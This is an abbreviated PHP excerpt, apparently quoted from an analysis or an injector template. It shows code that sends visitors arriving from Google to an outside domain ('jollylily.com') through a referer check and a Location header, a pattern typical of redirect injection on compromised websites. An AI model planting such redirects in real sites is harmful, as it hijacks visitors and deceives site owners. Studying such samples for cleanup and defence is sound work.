...
//
    ...
    /* add redirection code start */
    redirection_from_google(/*{{target_domain}}*/'jollylily.com'/*{{/target_domain}}*/);
    /* add redirection code end */
...
/* redirection from google start */
function redirection_from_google($target_domain)
{
    ...
    if (preg_match($pattern, $referer)) {
        ...
        header("Location: http://{$target_domain}{$request_uri}");
        exit();
    }
}
/* redirection from google end */
